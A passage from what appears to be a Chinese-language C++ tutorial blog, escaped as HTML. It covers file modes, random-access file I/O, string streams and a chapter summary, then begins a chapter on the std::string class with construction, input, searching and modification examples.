std::cout &lt;&lt; &quot;Processed &quot; &lt;&lt; argv[1] &lt;&lt; &quot; to &quot; &lt;&lt; argv[2] &lt;&lt; std::endl; return 0;&#125; 编译后，可以这样运行：./my_program data.in results.out 17.4.5 文件模式在打开文件时（通过构造函数或 open() 方法），可以指定文件模式 (file mode) 来控制文件的打开方式。文件模式是定义在 ios_base 类中的常量，类型为 openmode (一种位掩码类型)。 常用的文件模式标志： ios_base::in: 以读取模式打开 (ifstream 默认)。 ios_base::out: 以写入模式打开 (ofstream 默认)。如果文件已存在，清空其内容；如果不存在，则创建。 ios_base::app (append): 以追加模式打开。写入操作将在文件末尾进行。如果文件不存在，则创建。此模式下通常隐含 ios_base::out。 ios_base::ate (at end): 打开文件并将初始位置定位到文件末尾。但仍可以在文件中的任何位置写入（与 app 不同，app 强制写入到末尾）。 ios_base::binary: 以二进制模式打开文件，而不是文本模式。在二进制模式下，不会对特殊字符（如换行符 \\n 或回车符 \\r）进行转换。这对于读写非文本文件（如图像、可执行文件）或需要精确字节控制的情况至关重要。 ios_base::trunc (truncate): 如果文件已存在，清空其内容。ios_base::out 模式默认包含此行为。 可以使用按位或运算符 (|) 来组合多个模式标志。 open() 方法: 除了构造函数，还可以使用 open() 方法打开文件。 123456789ofstream outFile;outFile.open(&quot;config.cfg&quot;, ios_base::out | ios_base::trunc); // 显式指定覆盖写入ifstream dataFile;dataFile.open(&quot;image.bin&quot;, ios_base::in | ios_base::binary); // 以二进制读取模式打开fstream ioFile;// 以读写模式打开，如果不存在则创建，不清空内容ioFile.open(&quot;log.dat&quot;, ios_base::in | ios_base::out | ios_base::binary); 默认模式: ifstream 默认模式是 ios_base::in。 ofstream 默认模式是 ios_base::out | ios_base::trunc。 fstream 没有默认模式，必须显式指定。 17.4.6 随机存取默认情况下，文件流是按顺序读取或写入的。但有时我们需要直接跳转到文件中的特定位置进行读写，这称为**随机存取 (Random Access)**。 文件流维护着内部的位置指针： 输入指针 (Get Pointer): istream (及 ifstream, fstream) 维护，指示下一次读取操作将从哪里开始。 输出指针 (Put Pointer): ostream (及 ofstream, fstream) 维护，指示下一次写入操作将在哪里进行。 可以使用以下方法来操作这些位置指针： seekg(offset, direction) (seek get): 移动输入指针。 seekp(offset, direction) (seek put): 移动输出指针。 offset: 一个整数值（类型通常是 streamoff），表示要移动的字节数。可以是正数（向文件末尾移动）或负数（向文件开头移动）。 direction: 一个枚举值（类型 seekdir，定义在 ios_base 中），指定 offset 的参考点： ios_base::beg: 从文件开头计算偏移量。 ios_base::cur: 从文件当前位置计算偏移量。 ios_base::end: 从文件末尾计算偏移量（此时 offset 通常为负数或零）。 tellg() (tell get): 返回输入指针的当前位置（类型通常是 streampos，可以转换为整数）。 tellp() (tell put): 返回输出指针的当前位置。 注意: 随机存取通常在二进制模式 (ios_base::binary) 下使用更可靠，因为文本模式下的字符转换可能会干扰精确的字节定位。 示例：随机访问文件 假设有一个存储记录的文件 records.dat，每条记录固定大小为 sizeof(Record)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;vector&gt;struct Record &#123; int id; char name[20]; double value;&#125;;int main() &#123; const char* filename = &quot;records.dat&quot;; const size_t recordSize = sizeof(Record); // --- 写入一些记录 --- std::ofstream outFile(filename, std::ios::out | std::ios::binary | std::ios::trunc); if (!outFile) &#123; /* error check */ return 1; &#125; std::vector&lt;Record&gt; records = &#123; &#123;1, &quot;Rec A&quot;, 10.1&#125;, &#123;2, &quot;Rec B&quot;, 20.2&#125;, &#123;3, &quot;Rec C&quot;, 30.3&#125;, &#123;4, &quot;Rec D&quot;, 40.4&#125; &#125;; for (const auto&amp; rec : records) &#123; outFile.write(reinterpret_cast&lt;const char*&gt;(&amp;rec), recordSize); &#125; outFile.close(); // --- 随机读取和修改记录 --- std::fstream ioFile(filename, std::ios::in | std::ios::out | std::ios::binary); if (!ioFile) &#123; /* error check */ return 1; &#125; Record tempRec; // 1. 读取第三条记录 (索引为 2) long position = 2 * recordSize; ioFile.seekg(position, std::ios::beg); // 定位到第三条记录的开头 if (ioFile.read(reinterpret_cast&lt;char*&gt;(&amp;tempRec), recordSize)) &#123; std::cout &lt;&lt; &quot;Read record at index 2: ID=&quot; &lt;&lt; tempRec.id &lt;&lt; &quot;, Name=&quot; &lt;&lt; tempRec.name &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to read record at index 2.&quot; &lt;&lt; std::endl; &#125; // 2. 修改第二条记录 (索引为 1) if (ioFile.good()) &#123; // 确保流状态良好 position = 1 * recordSize; ioFile.seekp(position, std::ios::beg); // 定位输出指针到第二条记录开头 // 读取原始记录 (可选，如果需要基于原始值修改) // ioFile.seekg(position, std::ios::beg); // ioFile.read(reinterpret_cast&lt;char*&gt;(&amp;tempRec), recordSize); // 准备新数据并写入 Record updatedRec = &#123;2, &quot;Record B Updated&quot;, 25.5&#125;; ioFile.write(reinterpret_cast&lt;const char*&gt;(&amp;updatedRec), recordSize); if (ioFile.fail()) &#123; std::cerr &lt;&lt; &quot;Failed to write updated record at index 1.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Updated record at index 1.&quot; &lt;&lt; std::endl; &#125; &#125; // 3. 获取文件大小 ioFile.seekg(0, std::ios::end); // 定位到文件末尾 long fileSize = ioFile.tellg(); // 获取当前位置 (即文件大小) std::cout &lt;&lt; &quot;File size: &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Number of records: &quot; &lt;&lt; fileSize / recordSize &lt;&lt; std::endl; ioFile.close(); return 0;&#125; 这个例子演示了如何使用 seekg 和 seekp 定位到文件中的特定字节位置，并使用 read 和 write 进行二进制数据的读写。 17.5 内核格式化到目前为止，我们讨论的 I/O 操作都是将数据发送到外部设备（如屏幕 cout）或文件（ofstream），或者从外部设备（cin）或文件（ifstream）读取数据。但有时，我们希望在内存中对数据进行格式化，将各种类型的数据（数字、字符等）转换成一个字符串，或者反过来，从一个字符串中按特定格式解析出各种类型的数据。 C++ 标准库通过 &lt;sstream&gt; 头文件提供了字符串流 (String Streams) 类来实现这种内核格式化 (In-memory Formatting) 或 内存中的 I/O。 &lt;sstream&gt; 定义了三个主要的类： ostringstream (output string stream): 继承自 ostream。它允许你像使用 cout 一样，使用插入运算符 (&lt;&lt;) 和其他 ostream 方法将各种类型的数据写入到一个内部的字符串缓冲区中。之后可以获取这个格式化好的字符串。 istringstream (input string stream): 继承自 istream。它允许你将一个已有的 std::string 或 C 风格字符串作为数据源，然后像使用 cin 一样，使用提取运算符 (&gt;&gt;) 和其他 istream 方法从中读取（解析）数据。 stringstream: 继承自 iostream。它结合了 ostringstream 和 istringstream 的功能，允许对同一个内部字符串缓冲区进行读取和写入操作。 这些字符串流类的行为与文件流或控制台流非常相似，因为它们共享相同的基类和接口。你可以使用同样的格式化操纵符（如 setw, setprecision, fixed, hex 等）来控制字符串流中的格式。 使用 ostringstream 进行格式化输出当你需要将不同类型的数据组合成一个格式化的字符串时，ostringstream 非常有用。 步骤: 包含头文件 #include &lt;sstream&gt;。 创建一个 ostringstream 对象。 像使用 cout 一样，使用 &lt;&lt; 将数据插入到流中。可以使用格式化操纵符。 使用 str() 成员函数获取流内部缓冲区中积累的 std::string 副本。 示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;sstream&gt; // 包含 sstream 头文件#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iomanip&gt; // for setprecision, fixedint main() &#123; // 1. 创建 ostringstream 对象 std::ostringstream oss; // 2. 向流中插入数据并格式化 std::string item = &quot;Gadget&quot;; int quantity = 3; double price = 12.99; double total = quantity * price; oss &lt;&lt; &quot;Item: &quot; &lt;&lt; item &lt;&lt; &quot;\\n&quot;; // 插入字符串和换行符 oss &lt;&lt; &quot;Quantity: &quot; &lt;&lt; quantity &lt;&lt; &quot;\\n&quot;; oss &lt;&lt; &quot;Price: $&quot; &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; price &lt;&lt; &quot;\\n&quot;; // 格式化浮点数 oss &lt;&lt; &quot;Total: $&quot; &lt;&lt; total; // 格式化设置是粘性的 // 3. 获取格式化后的字符串 std::string formatted_string = oss.str(); // 4. 输出或使用该字符串 std::cout &lt;&lt; &quot;--- Formatted Output String ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; formatted_string &lt;&lt; std::endl; /* Output: Item: Gadget Quantity: 3 Price: $12.99 Total: $38.97 */ // ostringstream 对象可以重用，但内容会继续累加 // oss &lt;&lt; &quot;\\nAnother line.&quot;; // std::cout &lt;&lt; &quot;\\nAfter adding more:\\n&quot; &lt;&lt; oss.str() &lt;&lt; std::endl; // 如果要清空并重用，可以调用 str(&quot;&quot;) 或重新构造 oss.str(&quot;&quot;); // 清空缓冲区 oss.clear(); // 清除可能存在的流状态 (虽然这里通常不需要) oss &lt;&lt; &quot;New content.&quot;; std::cout &lt;&lt; &quot;\\nAfter clearing and adding:\\n&quot; &lt;&lt; oss.str() &lt;&lt; std::endl; // Output: New content. return 0;&#125; ostringstream 常用于需要动态构建包含数值和其他数据的日志消息、文件名或显示文本的场景。 使用 istringstream 进行格式化输入当你有一个字符串，并且想从中按特定格式提取数据（例如，解析配置文件的一行或用户输入的复合数据）时，istringstream 非常有用。 步骤: 包含头文件 #include &lt;sstream&gt;。 准备好包含待解析数据的 std::string。 使用该字符串创建一个 istringstream 对象。 像使用 cin 一样，使用 &gt;&gt; 从流中提取数据到变量中。 可以检查流的状态（如 good(), fail(), eof()) 来判断提取是否成功。 示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;int main() &#123; std::string data = &quot;Alice 30 95.5&quot;; // 模拟一行数据 std::string config_line = &quot;window_width = 800&quot;; std::string csv_data = &quot;10,20,30,40&quot;; // 1. 解析空格分隔的数据 std::istringstream iss1(data); std::string name; int age; double score; if (iss1 &gt;&gt; name &gt;&gt; age &gt;&gt; score) &#123; // 尝试提取 std::cout &lt;&lt; &quot;Parsed from data: Name=&quot; &lt;&lt; name &lt;&lt; &quot;, Age=&quot; &lt;&lt; age &lt;&lt; &quot;, Score=&quot; &lt;&lt; score &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse data string.&quot; &lt;&lt; std::endl; &#125; // 2. 解析配置文件行 std::istringstream iss2(config_line); std::string key, eq; int value; if (iss2 &gt;&gt; key &gt;&gt; eq &gt;&gt; value &amp;&amp; key == &quot;window_width&quot; &amp;&amp; eq == &quot;=&quot;) &#123; std::cout &lt;&lt; &quot;Parsed config: Key=&quot; &lt;&lt; key &lt;&lt; &quot;, Value=&quot; &lt;&lt; value &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse config line.&quot; &lt;&lt; std::endl; &#125; // 3. 解析逗号分隔的数据 (需要手动处理分隔符) std::istringstream iss3(csv_data); std::vector&lt;int&gt; numbers; int num; char comma; while (iss3 &gt;&gt; num) &#123; // 读取一个数字 numbers.push_back(num); if (iss3 &gt;&gt; comma &amp;&amp; comma == &#x27;,&#x27;) &#123; // 读取并检查逗号 continue; // 如果有逗号，继续循环 &#125; else &#123; break; // 如果没有逗号或读取失败，结束循环 &#125; &#125; // 检查流状态，确保是因为到达末尾而不是其他错误 if (!iss3.eof() &amp;&amp; iss3.fail() &amp;&amp; !iss3.bad()) &#123; // 可能最后一个数字后面没有逗号，这是正常的 &#125; else if (!iss3.eof()) &#123; std::cerr &lt;&lt; &quot;Error parsing CSV data.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Parsed CSV numbers: &quot;; for (int n : numbers) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; istringstream 常用于解析从文件、网络或用户界面接收到的文本数据。 使用 stringstream 进行读写stringstream 允许你在同一个字符串缓冲区上进行输入和输出操作。你可以先向其中写入数据，然后从中读取数据，或者反过来。 示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::stringstream ss; // 1. 写入数据到 stringstream int val1 = 10; double val2 = 3.14; ss &lt;&lt; &quot;Data: &quot; &lt;&lt; val1 &lt;&lt; &quot; &quot; &lt;&lt; val2; // 2. 从同一个 stringstream 读取数据 std::string label; int read_val1; double read_val2; // 在读取之前，通常不需要显式重置位置，因为写入指针和读取指针是独立的 // 但如果写入后立即读取，读取指针仍在开头 if (ss &gt;&gt; label &gt;&gt; read_val1 &gt;&gt; read_val2) &#123; std::cout &lt;&lt; &quot;Read from stringstream: Label=&quot; &lt;&lt; label &lt;&lt; &quot;, Val1=&quot; &lt;&lt; read_val1 &lt;&lt; &quot;, Val2=&quot; &lt;&lt; read_val2 &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to read from stringstream.&quot; &lt;&lt; std::endl; &#125; // 3. 清空并重用，先读取后写入 ss.str(&quot;100 Hello&quot;); // 设置新的内容，并重置读写位置 ss.clear(); // 清除 EOF 或其他状态 int num; std::string word; ss &gt;&gt; num &gt;&gt; word; // 读取 100 和 &quot;Hello&quot; // 写入新内容 (会覆盖或追加，取决于实现和指针位置，通常是覆盖) // 为了安全地追加，最好先获取当前内容，追加后再设置回去，或者使用 ostringstream std::string current_content = ss.str(); // 获取 &quot;100 Hello&quot; ss.str(&quot;&quot;); // 清空 ss.clear(); ss &lt;&lt; current_content &lt;&lt; &quot; World &quot; &lt;&lt; num * 2; // 写入旧内容、新内容和计算结果 std::cout &lt;&lt; &quot;Final stringstream content: &quot; &lt;&lt; ss.str() &lt;&lt; std::endl; // Output: 100 Hello World 200 return 0;&#125; stringstream 在需要对字符串进行多次格式化转换或解析的场景中很有用，例如在不同格式之间转换数据。 总结: 字符串流提供了一种强大而灵活的方式，可以在内存中完成数据的格式化和解析，其接口与标准的控制台和文件 I/O 保持一致，易于学习和使用。 17.6 总结本章详细介绍了 C++ 的输入/输出 (I/O) 系统，该系统基于流 (Stream) 的概念，提供了一个统一的接口来处理来自不同源（键盘、文件）和去往不同目的地（屏幕、文件）的数据流。 主要内容回顾： I/O 概述: 流: 字节序列的抽象，用于连接程序和 I/O 设备。 缓冲区: 临时存储区域，用于提高 I/O 效率。分为完全缓冲、行缓冲、无缓冲。 &lt;iostream&gt;: 提供了核心 I/O 类（ios_base, ios, istream, ostream, iostream）和标准流对象 (cin, cout, cerr, clog)。 重定向: 操作系统功能，允许改变标准输入/输出/错误流的来源和目的地，而无需修改代码。 使用 cout 输出: 主要使用重载的插入运算符 (&lt;&lt;) 输出各种数据类型。 支持链接操作 (cout &lt;&lt; a &lt;&lt; b;)。 提供 put() 输出单个字符，write() 输出指定字节数的内存块。 缓冲区刷新: 可以通过 endl (换行并刷新)、flush (仅刷新)、ends (插入 \\0 并刷新) 或在特定条件下自动刷新。&#39;\\n&#39; 只插入换行符。 格式化: 可以通过成员函数 (width(), precision(), fill(), setf()) 或操纵符 (setw(), setprecision(), setfill(), fixed, scientific, hex, oct, dec, left, right, boolalpha 等，需包含 &lt;iomanip&gt;) 控制输出的宽度、精度、填充、对齐、基数、浮点数表示等。 使用 cin 输入: 主要使用重载的提取运算符 (&gt;&gt;) 读取数据。默认跳过前导空白，读取直到遇到不匹配字符或空白。 流状态: cin 维护状态位 (goodbit, eofbit, failbit, badbit)。可以通过 good(), eof(), fail(), bad() 或流对象本身在布尔上下文中检查状态。failbit 表示格式错误，eofbit 表示到达文件尾。 错误处理: 读取失败后，需使用 clear() 清除错误状态，并使用 ignore() 丢弃缓冲区中的无效输入。 其他方法: get() (读取单个字符，不跳过空白)、getline() (读取一行到 C 风格数组，丢弃分隔符)、read() (读取指定字节数)、peek() (查看下一个字符)、gcount() (获取上次读取的字符数)、putback() (放回字符)、ignore() (丢弃字符)。 文件 I/O (&lt;fstream&gt;): 使用 ifstream (输入)、ofstream (输出)、fstream (输入/输出) 类。 通过构造函数或 open() 方法关联文件，并指定文件模式 (in, out, app, ate, binary, trunc)。 必须使用 is_open() 或检查流状态来确认文件是否成功打开。 使用与 cin/cout 类似的操作符和方法进行读写。 文件流对象在销毁时自动关闭文件。 可以通过 argc 和 argv 处理命令行参数来指定文件名。 随机存取: 使用 seekg() / tellg() (输入指针) 和 seekp() / tellp() (输出指针) 在文件中定位读写位置，常用于二进制文件。 内核格式化 (&lt;sstream&gt;): 在内存中进行格式化转换。 ostringstream: 将各种数据类型格式化输出到一个内部字符串缓冲区，通过 str() 获取结果字符串。 istringstream: 将已有字符串作为输入源，从中按格式解析提取数据。 stringstream: 支持对同一个内部字符串缓冲区进行读写操作。 接口与文件流和控制台流一致，支持格式化操纵符。 C++ 的 iostream 库提供了一个类型安全、可扩展且功能丰富的 I/O 框架，适用于控制台、文件以及内存中的格式化操作。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 16 string 类和标准模板库","slug":"Cpp_tutorial_Chapter_16","date":"2025-04-30T15:42:24.021Z","updated":"2025-04-30T15:40:40.028Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_16/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_16/","excerpt":"","text":"16.1 string 类我们在第 4 章已经初步接触了 C++ 标准库中的 string 类。与 C 语言风格的、以空字符结尾的字符数组（C-风格字符串）相比，string 类提供了更强大、更安全、更方便的字符串处理方式。 优点: 自动内存管理: string 对象会自动管理存储字符串所需的内存，无需手动分配和释放，避免了许多 C 风格字符串常见的内存错误（如缓冲区溢出）。 丰富的操作: 提供了大量的成员函数用于字符串的查找、拼接、比较、修改、插入、删除等操作。 安全性: 成员函数通常会进行边界检查（如 at() 方法），或者提供明确定义的操作行为。 与 STL 兼容: 可以方便地与标准模板库 (STL) 中的算法和容器一起使用。 string 类实际上是模板类 basic_string&lt;char&gt; 的一个 typedef（类型别名）。它定义在 &lt;string&gt; 头文件中。 1#include &lt;string&gt; // 必须包含此头文件 16.1.1 构造字符串创建 string 对象有多种方式（构造函数）： 默认构造函数: 创建一个空字符串。 1std::string s1; // s1 是一个空字符串 &quot;&quot; *从 C 风格字符串 (const char)**: 用一个 C 风格字符串来初始化 string 对象。 123std::string s2 = &quot;Hello&quot;; // 从字符串字面值初始化const char* c_str = &quot;World&quot;;std::string s3(c_str); // 从 const char* 变量初始化 复制构造函数: 用另一个 string 对象来初始化。 12std::string s4 = s2; // s4 的内容是 &quot;Hello&quot;std::string s5(s4); // s5 的内容也是 &quot;Hello&quot; 从 C 风格字符串的部分内容: 用 C 风格字符串的前 n 个字符初始化。 12const char* long_cstr = &quot;Programming&quot;;std::string s6(long_cstr, 7); // 用 &quot;Programming&quot; 的前 7 个字符初始化 s6，内容是 &quot;Program&quot; 从 string 对象的部分内容 (子字符串): 用另一个 string 对象的子字符串初始化。 12std::string s7 = &quot;Example String&quot;;std::string s8(s7, 8, 6); // 从 s7 的索引 8 开始，取 6 个字符初始化 s8，内容是 &quot;String&quot; 填充构造函数: 用 n 个重复的字符 c 初始化。 1std::string s9(10, &#x27;-&#x27;); // s9 的内容是 &quot;----------&quot; 从迭代器范围: 用一对指向字符序列的迭代器（例如来自另一个容器或 C 风格数组）来初始化。 12345char char_array[] = &#123;&#x27;T&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;t&#x27;&#125;;std::string s10(char_array, char_array + sizeof(char_array)); // s10 内容是 &quot;Test&quot;std::vector&lt;char&gt; char_vec = &#123;&#x27;D&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;a&#x27;&#125;;std::string s11(char_vec.begin(), char_vec.end()); // s11 内容是 &quot;Data&quot; 使用初始化列表 (C++11): 12std::string s12 = &#123;&#x27;I&#x27;, &#x27;n&#x27;, &#x27;i&#x27;, &#x27;t&#x27;&#125;; // s12 内容是 &quot;Init&quot;std::string s13 &#123;&quot;List&quot;&#125;; // s13 内容是 &quot;List&quot; 示例: 123456789101112131415161718192021222324#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;vector&gt;int main() &#123; std::string s1; std::string s2 = &quot;Hello&quot;; std::string s3(s2); std::string s4(5, &#x27;x&#x27;); const char* phrase = &quot;World Wide Web&quot;; std::string s5(phrase, 5); // &quot;World&quot; std::string s6(phrase + 6, 4); // &quot;Wide&quot; (从索引6开始取4个) std::string s7(s2, 1, 3); // 从 s2[1] 开始取 3 个: &quot;ell&quot; std::cout &lt;&lt; &quot;s1: &quot; &lt;&lt; s1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s2: &quot; &lt;&lt; s2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s3: &quot; &lt;&lt; s3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s5: &quot; &lt;&lt; s5 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s6: &quot; &lt;&lt; s6 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s7: &quot; &lt;&lt; s7 &lt;&lt; std::endl; return 0;&#125; 16.1.2 string 类输入从输入流（如 cin）读取数据到 string 对象主要有两种方式： 使用 operator&gt;&gt;: 行为类似于读取 C 风格字符串或基本数据类型。 它会跳过开头的所有空白字符（空格、制表符、换行符）。 然后读取非空白字符，直到遇到下一个空白字符为止。 读取的内容（不包括结尾的空白字符）存储在 string 对象中。 12345678910111213141516171819#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;sstream&gt; // 用于字符串流示例int main() &#123; std::string word1, word2; std::cout &lt;&lt; &quot;Enter two words separated by space: &quot;; // 例如输入 &quot;Hello World&quot; std::cin &gt;&gt; word1 &gt;&gt; word2; std::cout &lt;&lt; &quot;Word 1: &quot; &lt;&lt; word1 &lt;&lt; std::endl; // 输出 &quot;Hello&quot; std::cout &lt;&lt; &quot;Word 2: &quot; &lt;&lt; word2 &lt;&lt; std::endl; // 输出 &quot;World&quot; // 演示跳过空白 std::stringstream ss(&quot; LeadingSpaces Word&quot;); std::string temp; ss &gt;&gt; temp; std::cout &lt;&lt; &quot;After skipping spaces: &quot; &lt;&lt; temp &lt;&lt; std::endl; // 输出 &quot;LeadingSpaces&quot; return 0;&#125; 使用 getline() 函数: 用于读取一整行输入，直到遇到指定的分隔符（默认为换行符 \\n）。 不会跳过开头的空白字符。 读取的内容（不包括分隔符本身）存储在 string 对象中。 分隔符会从输入流中被读取并丢弃。 *函数原型:** 1234#include &lt;string&gt;#include &lt;istream&gt; // getline 定义在这里std::istream&amp; getline(std::istream&amp; is, std::string&amp; str, char delim = &#x27;\\n&#x27;); 123456789101112131415161718#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::string line1, line2; std::cout &lt;&lt; &quot;Enter a line of text: &quot;; // 注意：如果之前有 &gt;&gt; 操作，可能需要清除缓冲区中的换行符 // std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); getline(std::cin, line1); // 读取整行，直到按 Enter std::cout &lt;&lt; &quot;Enter another line: &quot;; getline(std::cin, line2); std::cout &lt;&lt; &quot;Line 1: &quot; &lt;&lt; line1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Line 2: &quot; &lt;&lt; line2 &lt;&lt; std::endl; return 0;&#125; 混合使用 &gt;&gt; 和 getline() 的问题:当 &gt;&gt; 读取输入后，它会将导致读取结束的空白字符（通常是换行符）留在输入缓冲区中。如果紧接着调用 getline()，它会立即读到这个换行符，认为读取到空行，然后结束。 解决方法: 在 &gt;&gt; 之后、getline() 之前，清除缓冲区中残留的换行符。常用的方法是使用 cin.ignore()： 123456789101112131415161718192021#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;limits&gt; // for numeric_limitsint main() &#123; int age; std::string name; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // 清除 cin &gt;&gt; age 后留下的换行符 std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Enter your full name: &quot;; getline(std::cin, name); std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Name: &quot; &lt;&lt; name &lt;&lt; std::endl; return 0;&#125; 16.1.3 使用字符串string 类提供了丰富的成员函数来操作字符串： 赋值: 使用 operator=。 12345std::string s1 = &quot;Initial&quot;;std::string s2;s2 = s1; // s2 内容变为 &quot;Initial&quot;s2 = &quot;New Value&quot;; // s2 内容变为 &quot;New Value&quot;s2 = &#x27;C&#x27;; // s2 内容变为 &quot;C&quot; 拼接/连接: 使用 operator+ 或 operator+=。可以与 string 对象、C 风格字符串或单个字符拼接。 12345std::string first = &quot;John&quot;;std::string last = &quot;Doe&quot;;std::string full = first + &quot; &quot; + last; // full 是 &quot;John Doe&quot;first += &quot;athan&quot;; // first 变为 &quot;Johnathan&quot;full += &#x27;!&#x27;; // full 变为 &quot;John Doe!&quot; 比较: 使用关系运算符 (==, !=, &lt;, &gt;, &lt;=, &gt;=)。比较是按字典顺序进行的。 12345678std::string str1 = &quot;Apple&quot;;std::string str2 = &quot;Banana&quot;;if (str1 &lt; str2) &#123; // true std::cout &lt;&lt; str1 &lt;&lt; &quot; comes before &quot; &lt;&lt; str2 &lt;&lt; std::endl;&#125;if (str1 == &quot;Apple&quot;) &#123; // true std::cout &lt;&lt; &quot;str1 is Apple&quot; &lt;&lt; std::endl;&#125; 获取长度/大小: 使用 length() 或 size() 方法（两者等价）。返回字符串中的字符数。 123std::string msg = &quot;Hello&quot;;std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; msg.length() &lt;&lt; std::endl; // 输出 5std::cout &lt;&lt; &quot;Size: &quot; &lt;&lt; msg.size() &lt;&lt; std::endl; // 输出 5 访问字符: operator[]: 提供快速访问，但不进行边界检查。访问越界是未定义行为。 at(): 提供边界检查的访问。如果索引越界，会抛出 std::out_of_range 异常。 123456789101112std::string word = &quot;World&quot;;char first_char = word[0]; // &#x27;W&#x27;char last_char = word[word.length() - 1]; // &#x27;d&#x27;// word[5] = &#x27;!&#x27;; // 危险！越界访问，未定义行为try &#123; char c = word.at(1); // &#x27;o&#x27; word.at(0) = &#x27;J&#x27;; // word 变为 &quot;Jorld&quot; c = word.at(10); // 越界，将抛出异常&#125; catch (const std::out_of_range&amp; oor) &#123; std::cerr &lt;&lt; &quot;Out of Range error: &quot; &lt;&lt; oor.what() &lt;&lt; std::endl;&#125; 查找: string 提供了多种查找方法： find(substr, pos=0): 从索引 pos 开始查找子串 substr 第一次出现的位置。 rfind(substr, pos=npos): 从索引 pos 向前查找子串 substr 最后一次出现的位置。 find_first_of(chars, pos=0): 从 pos 开始查找 chars 中任何一个字符第一次出现的位置。 find_last_of(chars, pos=npos): 从 pos 向前查找 chars 中任何一个字符最后一次出现的位置。 find_first_not_of(chars, pos=0): 从 pos 开始查找第一个不在 chars 中的字符的位置。 find_last_not_of(chars, pos=npos): 从 pos 向前查找最后一个不在 chars 中的字符的位置。 所有查找方法如果找到，返回匹配的起始索引；如果找不到，返回 std::string::npos (一个静态成员常量，通常是 -1 或最大无符号整数值)。 1234567891011121314151617181920212223242526272829303132#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::string text = &quot;The quick brown fox jumps over the lazy dog.&quot;; std::string search_str = &quot;the&quot;; std::string vowels = &quot;aeiouAEIOU&quot;; size_t pos = text.find(search_str); // 查找 &quot;the&quot; if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; search_str &lt;&lt; &quot;&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // 输出 35 &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; search_str &lt;&lt; &quot;&#x27; not found.&quot; &lt;&lt; std::endl; &#125; pos = text.find(&quot;The&quot;); // 查找 &quot;The&quot; if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;&#x27;The&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // 输出 0 &#125; pos = text.find_first_of(vowels); // 查找第一个元音 if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;First vowel &#x27;&quot; &lt;&lt; text[pos] &lt;&lt; &quot;&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // 输出 &#x27;e&#x27; at 2 &#125; pos = text.find_first_not_of(&quot; &quot;); // 查找第一个非空格 if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;First non-space &#x27;&quot; &lt;&lt; text[pos] &lt;&lt; &quot;&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // 输出 &#x27;T&#x27; at 0 &#125; return 0;&#125; 修改: insert(pos, str): 在索引 pos 处插入字符串 str。 erase(pos, count): 从索引 pos 开始删除 count 个字符。 replace(pos, count, str): 将从 pos 开始的 count 个字符替换为 str。 append(str): 在末尾追加 str (等价于 +=)。 assign(str): 替换整个字符串内容为 str (等价于 =)。 12345std::string phrase = &quot;Hello world&quot;;phrase.insert(6, &quot;beautiful &quot;); // &quot;Hello beautiful world&quot;phrase.erase(0, 6); // &quot;beautiful world&quot;phrase.replace(0, 9, &quot;Wonderful&quot;); // &quot;Wonderful world&quot;phrase.append(&quot;!&quot;); // &quot;Wonderful world!&quot; 获取 C 风格字符串: c_str(): 